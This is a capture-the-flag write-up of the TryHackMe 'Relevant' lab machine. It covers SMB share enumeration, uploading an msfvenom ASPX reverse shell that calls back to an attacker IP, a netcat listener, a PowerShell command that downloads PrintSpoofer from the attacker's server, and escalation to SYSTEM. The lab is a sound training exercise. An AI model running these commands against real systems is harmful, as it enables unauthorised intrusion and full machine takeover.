# TryHackMe: [Relevant](https://tryhackme.com/room/relevant) — Writeup

## Summary
In this machine, we exploited an SMB vulnerability (CVE-2017–0143), discovered accessible SMB shares, used an ASPX reverse shell payload to gain a foothold, and escalated privileges using SeImpersonatePrivilege via PrintSpoofer.

## Scanning port
We start by scanning open ports and service versions:
```python
nmap -sV -sC -vvv 10.10.96.120
```
Results:
```python
Ports 80 and 49663 — Microsoft IIS
Ports 139 and 445 — SMB
Port 3389 — RDP
```
We visited both IIS web pages but found nothing of value.

## Vulnerability Detection

From the service scan, we identified:
CVE-2017–0143 — SMBv1 Remote Code Execution (EternalBlue)

## SMB Share Enumeration

List the SMB shares:
```python
smbclient -L //10.10.96.120 -N
```
We discovered an interesting share: nt4wrksv.

Access and recursively download its contents:

```python
smbclient //10.10.96.120/nt4wrksv -U "nothing" -c "recurse; prompt; mget *"
```
Inside, we found a file called passwords.txt containing credentials for bob, although we didn’t use them directly.

## Gaining RCE via SMB & IIS

We generate an ASPX reverse shell payload using msfvenom:

```python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f aspx -o exploit.aspx
```
Then we upload it to the SMB share:
```python
smbclient //10.10.96.120/nt4wrksv
put exploit.aspx
```
Start a Netcat listener:
```python
nc -lvnp 8080
```
Trigger the payload in the browser:
```python
http://10.10.96.120:49663/nt4wrksv/exploit.aspx
```
We get a reverse shell. Then we read user.txt.

## Privilege Escalation
Check privileges:
```python
whoami /priv
```
We see SeImpersonatePrivilege — vulnerable to PrintSpoofer.

Start a Python HTTP server:

```python
python3 -m http.server 8000
```
On the victim machine:
```python
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/PrintSpoofer64.exe', 'spoofer.exe')"
spoofer.exe -i -c cmd
```
This gives us a SYSTEM shell. We read root.txt.

## Conclusion

Relevant is a great machine to practice:

* SMB and IIS enumeration,

* CVE-based exploitation (EternalBlue),

* manual payload upload via SMB and execution via IIS,

* privilege escalation using SeImpersonatePrivilege + PrintSpoofer.
